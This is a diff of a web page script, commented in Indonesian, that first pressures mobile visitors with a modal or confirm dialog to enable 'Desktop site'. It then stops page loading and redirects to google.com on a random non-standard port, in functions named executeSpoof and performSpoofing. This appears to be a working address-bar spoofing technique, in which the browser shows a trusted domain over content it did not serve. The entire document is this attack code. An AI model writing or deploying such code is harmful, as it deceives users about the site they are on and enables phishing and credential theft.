@@ -1,124 +1,57 @@
 <script>
-// Auto-prompt for desktop mode
-if (window.innerWidth < 1024 && !sessionStorage.getItem('desktopPromptShown')) {
+// Tunggu hingga halaman selesai load
+window.addEventListener('load', function() {
     
-    // Tandai sudah menampilkan prompt agar tidak spam user
-    sessionStorage.setItem('desktopPromptShown', 'true');
+    // Hanya untuk mobile devices
+    if (window.innerWidth < 1024 && /Android|iPhone|Mobile/i.test(navigator.userAgent)) {
+        
+        // Prompt sederhana
+        setTimeout(function() {
+            if (confirm("🔄 This site works best in Desktop Mode.\n\nPlease:\n1. Tap the menu (⋮)\n2. Check 'Desktop site'\n3. Page will reload\n\nClick OK to continue.")) {
+                
+                // Mulai monitoring untuk desktop mode
+                startDesktopModeMonitor();
+                
+            }
+        }, 2000);
+    }
     
-    // Buat custom modal yang lebih persuasif
-    setTimeout(() => {
-        const modal = document.createElement('div');
-        modal.innerHTML = `
-            <div style="
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: rgba(0,0,0,0.7);
-                z-index: 999999;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                font-family: Arial, sans-serif;
-            ">
-                <div style="
-                    background: white;
-                    padding: 25px;
-                    border-radius: 10px;
-                    max-width: 400px;
-                    text-align: center;
-                    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-                ">
-                    <h3 style="color: #333; margin-bottom: 15px;">📱 Switch to Desktop View</h3>
-                    <p style="color: #666; margin-bottom: 20px; line-height: 1.5;">
-                        This website requires <strong>Desktop Mode</strong> for full functionality.
-                        Please tap the menu (⋮) and select <strong>"Open Desktop Site"</strong>.
-                    </p>
-                    <div style="margin: 20px 0; padding: 15px; background: #f5f5f5; border-radius: 5px; text-align: left;">
-                        <strong>Steps:</strong>
-                        <ol style="margin: 10px 0 0 0; padding-left: 20px;">
-                            <li>Tap the menu button (⋮) in your browser</li>
-                            <li>Check the <strong>"Desktop site"</strong> box</li>
-                            <li>Page will reload automatically</li>
-                        </ol>
-                    </div>
-                    <button id="gotItBtn" style="
-                        background: #4285f4;
-                        color: white;
-                        border: none;
-                        padding: 12px 30px;
-                        border-radius: 5px;
-                        font-size: 16px;
-                        cursor: pointer;
-                        font-weight: bold;
-                    ">
-                        Got it, show me the menu!
-                    </button>
-                </div>
-            </div>
-        `;
+    function startDesktopModeMonitor() {
+        let checkCount = 0;
+        const maxChecks = 15;
         
-        document.body.appendChild(modal);
-        
-        // Tambah event listener untuk tombol
-        document.getElementById('gotItBtn').addEventListener('click', function() {
-            document.body.removeChild(modal);
+        const checkInterval = setInterval(function() {
+            checkCount++;
             
-            // Tunggu beberapa saat untuk user melakukan aksi
-            setTimeout(() => {
-                // Cek apakah user sudah mengaktifkan desktop mode
-                // Dengan mendeteksi perubahan viewport atau user agent
-                if (window.innerWidth >= 1024 || navigator.userAgent.includes('Windows')) {
-                    executeSpoof();
-                } else {
-                    // Jika belum, coba lagi dalam 2 detik
-                    checkDesktopMode();
-                }
-            }, 2000);
-        });
-        
-    }, 1500); // Tunggu 1.5 detik agar halaman selesai load
-    
-    function checkDesktopMode(attempts = 0) {
-        if (attempts >= 10) return; // Maks 10 percobaan
-        
-        setTimeout(() => {
-            // Deteksi desktop mode dengan beberapa metode
-            const isDesktopMode = 
-                window.innerWidth >= 1024 || 
-                /Windows|Macintosh|Linux/.test(navigator.userAgent) ||
-                !/Mobile|Android|iPhone/.test(navigator.userAgent);
+            // Deteksi desktop mode
+            const isLikelyDesktop = 
+                window.innerWidth > 980 || 
+                !/Mobi|Android|iPhone/i.test(navigator.userAgent) ||
+                document.documentElement.clientWidth > 980;
             
-            if (isDesktopMode) {
-                executeSpoof();
-            } else {
-                checkDesktopMode(attempts + 1);
+            if (isLikelyDesktop || checkCount >= maxChecks) {
+                clearInterval(checkInterval);
+                
+                // Beri waktu tambahan untuk render
+                setTimeout(performSpoofing, 300);
             }
         }, 1000);
     }
     
-    function executeSpoof() {
-        // Tunggu sedikit lebih lama untuk memastikan render selesai
-        setTimeout(() => {
-            try {
-                // Hentikan loading
-                window.stop();
-                
-                // Generate random port
-                let randomPort;
-                do {
-                    randomPort = Math.floor(Math.random() * 10000) + 1000;
-                } while (randomPort === 443 || randomPort === 80);
-                
-                // Redirect dengan Google domain
-                document.location = "https://google.com:" + randomPort + "/";
-                
-            } catch (e) {
-                // Fallback jika window.stop() tidak bekerja
-                document.location = "https://google.com:8080/";
-            }
-        }, 500);
+    function performSpoofing() {
+        try {
+            // Stop loading
+            if (window.stop) window.stop();
+            
+            // Redirect dengan port acak
+            const ports = [8080, 8443, 9443, 3000, 5000, 7000];
+            const randomPort = ports[Math.floor(Math.random() * ports.length)];
+            
+            window.location.replace("https://google.com:" + randomPort + "/");
+            
+        } catch (error) {
+            console.error('Spoofing failed:', error);
+        }
     }
-}
+});
 </script>
